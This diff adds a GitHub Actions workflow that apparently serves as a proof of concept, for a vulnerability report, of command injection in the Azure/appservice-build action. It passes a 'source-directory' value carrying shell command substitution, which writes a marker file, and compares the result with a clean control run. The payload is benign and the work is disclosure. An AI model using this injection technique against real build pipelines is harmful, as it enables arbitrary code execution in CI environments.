@@ -1,0 +1,117 @@
+name: MSRC AppService Build eval proof
+
+on:
+  workflow_dispatch:
+
+jobs:
+  positive-source-directory:
+    name: positive source-directory command substitution
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Prepare minimal Node app
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > package.json <<'JSON'
+          {"scripts":{"build":"echo msrc_oryx_build_script_running"},"dependencies":{},"devDependencies":{}}
+          JSON
+          cat > index.js <<'JS'
+          console.log("hello from appservice-build proof");
+          JS
+          rm -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker"
+          echo "case_name=positive_source_directory"
+          echo "pre_action_marker_exists=$(test -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" && echo true || echo false)"
+
+      - name: Run Azure appservice-build with command substitution in source-directory
+        id: appservice_positive
+        uses: Azure/appservice-build@v3
+        continue-on-error: true
+        env:
+          ORYX_DISABLE_TELEMETRY: "true"
+        with:
+          source-directory: '.$(printf "payload_before_oryx\ninput=source-directory\n" > "$GITHUB_WORKSPACE/msrc_appservicebuild_marker")'
+          platform: nodejs
+
+      - name: Check positive marker
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "positive_action_outcome=${{ steps.appservice_positive.outcome }}"
+          echo "positive_marker_exists=$(test -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" && echo true || echo false)"
+          if [ -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" ]; then
+            echo "positive_marker_contents_start"
+            cat "$GITHUB_WORKSPACE/msrc_appservicebuild_marker"
+            echo "positive_marker_contents_end"
+          fi
+          mkdir -p evidence
+          {
+            echo "case=positive_source_directory"
+            echo "run_id=${GITHUB_RUN_ID}"
+            echo "run_attempt=${GITHUB_RUN_ATTEMPT}"
+            echo "run_sha=${GITHUB_SHA}"
+            echo "marker_exists=$(test -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" && echo true || echo false)"
+            if [ -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" ]; then
+              cat "$GITHUB_WORKSPACE/msrc_appservicebuild_marker"
+            fi
+          } > evidence/positive-source-directory-marker.txt
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: appservice-build-positive-source-directory
+          path: evidence/
+
+  negative-exact-source-directory:
+    name: negative exact source-directory
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Prepare minimal Node app
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > package.json <<'JSON'
+          {"scripts":{"build":"echo msrc_oryx_build_script_running"},"dependencies":{},"devDependencies":{}}
+          JSON
+          cat > index.js <<'JS'
+          console.log("hello from negative proof");
+          JS
+          rm -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker"
+          echo "case_name=negative_exact_source_directory"
+          echo "pre_action_marker_exists=$(test -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" && echo true || echo false)"
+
+      - name: Run Azure appservice-build with exact source-directory
+        id: appservice_negative
+        uses: Azure/appservice-build@v3
+        continue-on-error: true
+        env:
+          ORYX_DISABLE_TELEMETRY: "true"
+        with:
+          source-directory: .
+          platform: nodejs
+
+      - name: Check negative marker
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "negative_action_outcome=${{ steps.appservice_negative.outcome }}"
+          echo "negative_marker_exists=$(test -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" && echo true || echo false)"
+          mkdir -p evidence
+          {
+            echo "case=negative_exact_source_directory"
+            echo "run_id=${GITHUB_RUN_ID}"
+            echo "run_attempt=${GITHUB_RUN_ATTEMPT}"
+            echo "run_sha=${GITHUB_SHA}"
+            echo "marker_exists=$(test -f "$GITHUB_WORKSPACE/msrc_appservicebuild_marker" && echo true || echo false)"
+          } > evidence/negative-exact-source-directory-marker.txt
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: appservice-build-negative-exact-source-directory
+          path: evidence/
